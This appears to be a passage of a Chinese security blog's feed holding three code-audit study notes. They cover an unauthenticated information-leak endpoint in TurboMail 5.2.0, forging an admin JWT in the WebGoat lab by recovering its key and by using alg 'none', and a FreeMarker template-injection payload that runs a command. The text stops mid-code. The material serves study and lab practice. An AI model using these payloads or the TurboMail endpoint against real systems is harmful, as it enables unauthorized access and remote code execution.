    <content type="html"><![CDATA[<p>这里以 TurboMail 5.2.0 里的敏感信息泄露漏洞作为学习。</p><p>已知 TurboMail 5.2.0 的敏感信息泄露路径为 /mailmain?type=pm</p><p>打开 TurboMail 的安装目录，在 turbomail\web\webapps\ROOT\WEB-INF 下找到 web.xml 文件，发现以下配置信息</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/mailmain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>turbomail.web.MailMain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从这些配置信息不难看出 /mailmain 路径对应的 servlet-name 是 mailmaini，而 mailmaini 对应的 servlet-class 是 turbomail.web.MailMain</p><p>那么这里就需要找到 turbomail.web.MailMain 类进行分析，假设这个类是在 turbomail.jar 文件里，通过搜索在 /turbomail/web/webapps/ROOT/WEB-INF/lib/ 下找到 turbomail.jar 文件</p><p>利用 jd-gui 或者 Intellij IDEA 对 turbomail.jar 进行反编译，可以在 turbomail/web/ 文件夹内找到 MailMain.java 文件，这说明之前的假设是正确的。</p><p>在 195 行可以看到接收了 type 参数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">195</span>  <span class="token class-name">String</span> type <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">196</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">197</span>      type <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token number">198</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 543 行可以看到如果 type 参数为 pm，则执行 PMAdmin 的 show 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">543</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"pm"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">544</span>     <span class="token class-name">PMAdmin</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看该方法的代码，可以看到并没有对用户身份进行验证</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> bAjax<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PMInterface</span> pm <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> alPM<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pm <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PMInterface</span><span class="token punctuation">)</span>alPM<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>pm<span class="token punctuation">.</span><span class="token function">PM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">String</span> str <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">SysConts<span class="token punctuation">.</span>New_InCharSet</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此直接访问 /mailmain?type=pm 就可以看到已登录的用户邮箱信息。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112151310177.png"></p><p>这个地方除了泄露登录用户邮箱外，type 后面跟上不同的参数还会泄露邮箱用户列表以及对管理员密码重置等，读者可以自己尝试去发现发现。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里以 TurboMail 5.2.0 里的敏感信息泄露漏洞作为学习。&lt;/p&gt;
&lt;p&gt;已知 TurboMail 5.2.0 的敏感信息泄露路径为 /mailmain?type=pm&lt;/p&gt;
&lt;p&gt;打开 TurboMail 的安装目录，在 turbomail\web\weba</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】JWT Token</title>
    <link href="https://www.teamssix.com/211214-175948.html"/>
    <id>https://www.teamssix.com/211214-175948.html</id>
    <published>2021-12-14T09:59:48.000Z</published>
    <updated>2021-12-14T11:07:43.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>JSON Web Token 缩写成 JWT，被用于和服务器的认证场景中，这一点有点类似于 Cookie 里的 Session id，关于这两者的区别可以看本文尾部的参考链接。</p><p>JWT 由三部分构成，分别为 Header（头部）、Payload（负载）、Signature（签名），三者以小数点分割，格式类似于这样：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">Header.Payload.Signature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际遇到的 JWT 一般是这种样子</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>JWT 的第一部分 Header 通常由两个部分组成：</strong></p><ul><li>alg 表示使用的签名算法，例如 RSA、HMAC SHA256（或简写为 HS256）</li><li>typ 表示 Token 的类型 Type</li></ul><p>通常写成以下 JSON 格式 的样子</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用 Base64URL 编码为 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9，就形成了 JWT 的第一部分。</p><p><strong>JWT 的第二部分 Payload  也是 JSON 的格式，例如：</strong></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"1234567890"</span><span class="token punctuation">,</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"John Doe"</span><span class="token punctuation">,</span>  <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1516239022</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后将该 JSON 对象进行 Base64URL 编码为 eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ，就形成了 JWT 的第二部分。</p><p>对于 Payload 官方规定了 7 个字段：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">iss (issuer)：签发人exp (expiration time)：过期时间sub (subject)：主题aud (audience)：受众nbf (Not Before)：生效时间iat (Issued At)：签发时间jti (JWT ID)：编号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除此之外，也是可以定义私有字段的。</p><p><strong>JWT 的第三部分 Signature 是对 Header 和 Payload 部分的签名，起到防止数据篡改的作用。</strong></p><p>首先需要指定一个密钥，这个密钥只有服务器知道，然后利用 Header 里指定的加密算法（默认是 HMAC SHA256）按照下面的公式生成签名。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),secret)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x01-靶场复现"><a href="#0x01-靶场复现" class="headerlink" title="0x01 靶场复现"></a>0x01 靶场复现</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这里使用 WebGoat 靶场进行 JWT Token 实验，直接 Docker 搭建即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker pull webgoat/goatandwolf<span class="token function">sudo</span> docker run -p <span class="token number">8080</span>:8080 -p <span class="token number">9090</span>:9090 -e <span class="token assign-left variable">TZ</span><span class="token operator">=</span>Europe/Amsterdam -d webgoat/goatandwolf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开之后，来到 (A2) Broken Authentication 找到 JWT Token 的第 5 关，可以看到这一关是需要修改 JWT Token 的值以 admin 身份进行投票重置，那么需要先找到 JWT 的加密密钥。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112141758858.png"></p><p>在点击重置投票按钮时，请求的 URL 为 <a href="http://172.16.214.20:8080/WebGoat/JWT/votings">http://172.16.214.20:8080/WebGoat/JWT/votings</a></p><p>Clone 源码到本地，看看在源码里能否找到什么有价值的信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/WebGoat/WebGoat.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接在代码里全局搜索 /JWT/votings</p><p>在 webgoat-lessons/jwt/src/main/java/org/owasp/webgoat/jwt/JWTVotesEndpoint.java 的第 163 行找到 @PostMapping(“/JWT/votings”)，通过函数名 resetVotes() 判断大概率是进行重置投票的函数。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/JWT/votings"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">AttackResult</span> <span class="token function">resetVotes</span><span class="token punctuation">(</span><span class="token annotation punctuation">@CookieValue</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"access_token"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> accessToken<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>accessToken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-invalid-token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Jwt</span> jwt <span class="token operator">=</span> <span class="token class-name">Jwts</span><span class="token punctuation">.</span><span class="token function">parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSigningKey</span><span class="token punctuation">(</span>JWT_PASSWORD<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>accessToken<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Claims</span> claims <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Claims</span><span class="token punctuation">)</span> jwt<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> isAdmin <span class="token operator">=</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> claims<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isAdmin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-only-admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                votes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>vote <span class="token operator">-></span> vote<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JwtException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-invalid-token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过分析代码，从上面代码的第 8 行中不难看出 JWT 的密码为 JWT_PASSWORD 变量，当 Cookie 中的 access_token 参数里的 Payload 部分（即上面代码里的第 10 行 claims.get）的 admin 参数值为 true 时则判断为 admin 用户，如果为 false 则返回 jwt-only-admin</p><p>通过在代码里查询 JWT_PASSWORD 变量，可以找到值为 victory</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JWTVotesEndpoint</span> <span class="token keyword">extends</span> <span class="token class-name">AssignmentEndpoint</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> JWT_PASSWORD <span class="token operator">=</span> <span class="token class-name">TextCodec</span><span class="token punctuation">.</span>BASE64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"victory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> validUsers <span class="token operator">=</span> <span class="token string">"TomJerrySylvester"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>知道了 jwt 密钥之后，在 <a href="https://jwt.io/">jwt.io</a> 上将 Payload 部分的 admin 值修改为 true ，在 Signature 部分添加密钥重新生成 JWT，然后 Burp 替换就可以成功重置投票了。</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>除了以上通过源码找 JWT 密钥的方法还可以利用将加密算法修改为 none，即通过不加密的方式进行绕过。</p><p>{“alg”:”none”} 编码后为 eyJhbGciOiJub25lIn0=，将 Payload 里的 admin 值修改为 true，最终构造 Token 如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">eyJhbGciOiJub25lIn0<span class="token operator">%</span><span class="token number">3d</span><span class="token punctuation">.</span>eyJpYXQiOjE2NDAzMTg4NTEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/ittranslator/p/14595165.html">https://www.cnblogs.com/ittranslator/p/14595165.html</a></p><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p><p>原文链接：</p><p><a href="https://www.teamssix.com/211214-175948.html">https://www.teamssix.com/211214-175948.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;JSON Web Token 缩写成 JWT，被用于和服务器的认证场景中，这一点有点类似于 Cook</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】模板注入</title>
    <link href="https://www.teamssix.com/211203-200441.html"/>
    <id>https://www.teamssix.com/211203-200441.html</id>
    <published>2021-12-03T12:04:41.000Z</published>
    <updated>2021-12-03T12:16:44.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>这里主要学习下 FreeMarker 模板注入，FreeMarker 是一款模板引擎，FreeMarker 模板文件与 HTML 一样都是静态页面，当用户访问页面时，FreeMarker 引擎会进行解析并动态替换模板中的内容进行渲染，然后将渲染后的结果返回到浏览器中。</p><h1 id="0x01-FreeMarker-模板"><a href="#0x01-FreeMarker-模板" class="headerlink" title="0x01 FreeMarker 模板"></a>0x01 FreeMarker 模板</h1><p>FreeMarker 模板语言（FreeMarker Template Language，FTL）由 4 个部分组成，分别如下：</p><ul><li><p>文本：包括 HTML 标签与静态文本等静态内容，该部分内容会原样输出</p></li><li><p>插值：这部分的输出会被模板引擎计算的值来替换，使用 ${} 这种语法</p></li><li><p>标签：和 HTML 标签类似，不会打印在输出的内容中，比如 &lt;#assign name=’bob’&gt;</p></li><li><p>注释：和 HTML 注释类似，由 &lt;#– 和 –&gt; 表示，注释部分的内容会 FreeMarker 忽略</p></li></ul><p>以下是一个 FreeMarker 模板内容示例：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Welcome TeamsSix!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#--</span> <span class="token attr-name">这是注释</span> <span class="token attr-name">--</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome !<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Our latest product:    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;latestProduct.url&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;latestProduct.name&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-模板注入利用"><a href="#0x02-模板注入利用" class="headerlink" title="0x02 模板注入利用"></a>0x02 模板注入利用</h1><h2 id="1、new-函数的利用"><a href="#1、new-函数的利用" class="headerlink" title="1、new 函数的利用"></a>1、new 函数的利用</h2><p>FreeMarker 中预制了大量了内建函数，其中 new 函数可以创建一个继承自 freemarker.template.TemplateModel 类的变量，利用这一点能达到执行任意代码的目的。</p><h3 id="利用方法一："><a href="#利用方法一：" class="headerlink" title="利用方法一："></a>利用方法一：</h3><p>freemarker.template.utility 里有个 Execute 类，通过观察源代码里的第 30 行可以看到这个类会调用 Runtime.getRuntime().exec 函数执行它的 aExecute 变量参数值，因此这里可以使用 new 函数传输想要执行的命令作为 aExecute 参数值，从而执行命令。</p><p>freemarker.template.utility.Execute 部分文件代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">22</span> <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">List</span> arguments<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TemplateModelException</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>    <span class="token class-name">StringBuilder</span> aOutputBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">24</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">25</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span><span class="token string">"Need an argument to execute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">26</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">27</span>        <span class="token class-name">String</span> aExecute <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>arguments<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">28</span><span class="token number">29</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">30</span>            <span class="token class-name">Process</span> exec <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>aExecute<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">31</span>            <span class="token class-name">InputStream</span> execOut <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>            <span class="token class-name">Throwable</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.Execute<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span>$&#123;value("open -a Calculator")&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001193.png"></p><h3 id="利用方法二："><a href="#利用方法二：" class="headerlink" title="利用方法二："></a>利用方法二：</h3><p>freemarker.template.utility 里有个 ObjectConstructor 类，通过观察源代码里的第 25 行可以看到这个类会把它的参数作为名称构造一个实例化对象。</p><p>因此也可以利用这一点构造一个可执行命令的对象，从而 RCE</p><p>freemarker.template.utility.ObjectConstructor 部分文件代码如下：</p><pre class="line-numbers language-java" data-language="java"><code 